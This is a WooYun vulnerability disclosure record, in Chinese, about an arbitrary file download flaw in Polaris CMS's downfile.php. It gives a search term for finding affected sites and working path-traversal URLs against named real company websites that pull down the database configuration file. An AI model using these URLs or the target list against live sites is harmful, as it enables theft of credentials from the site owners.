{"id": 55957, "wybug_id": "wooyun-2014-059438", "wybug_title": "某企业建站系统cms任意文件下载漏洞(影响多个实例)", "wybug_corp": "Polaris cms", "wybug_author": "梧桐雨", "wybug_date": "2014-05-05 10:43", "wybug_open_date": "2014-08-03 10:44", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取利用", "任意文件读取", "文件操作参数未加过滤"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-05：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-08-03：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 任意文件下载 详细说明：  存在该漏洞的cms是 Polaris cmsgoogle关键字：downfile.php?direct 就可以找到许多，有的找不到的 请看我下面提供的列表即可：）主要是当开启了下载模块：即download.php。对传入的参数没有进行很好的过滤。产生了任意文件下载。来看看实例1http://www.sigmarobot.com/开启了下载模块之后我们访问如下链接：\nhttp://www.sigmarobot.com/downfile.php?direct=../&file=downfile.php\n文件源码妥妥的，躺在了 我们的文件夹中\n\n呀。。这根本没有过滤啊！通过对文件系统的首页下载分析。得到数据库配置文件：utility.php 好咯，既然在根目录，我们直接就down回来看看http://www.sigmarobot.com/downfile.php?direct=../&file=utility.php\n\n一切都那么自然。。   漏洞证明：  好了，下面来一波：http://www.sigmarobot.com/downfile.php?direct=../&file=utility.php\n\nhttp://www.tan-star.com.tw/downfile.php?direct=../&file=utility.php\n\n\n\nhttp://www.injection.com.tw/downfile.php?direct=../&file=utility.php全部贴图有点累，就贴上面这些吧。下面这些也是可以下载的哦：www.chaowei.com.tw/downfile.php?direct=../&file=downfile.phpwww.injection.com.tw/downfile.php?direct=../&file=downfile.phpwww.webcontrol.com.tw/downfile.php?direct=../&file=downfile.phphttp://www.sencar.com.tw/downfile.php?direct=../&file=downfile.phphttp://www.avitaplas.com/downfile.php?direct=../&file=downfile.phphttp://www.human-video.com/downfile.php?direct=../&file=downfile.php不一一列举了。。。这里有一个列表：http://www.polaris.net.tw/tw/webdesign_list.html 得注意这个漏洞的条件只需要网站系统开启了下载模块 download.php即可了！看了下，影响较多台湾小企业网站，大陆只是占少数。   修复方案：  对传入参数进行有效性验证。   版权声明：转载请注明来源 梧桐雨@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}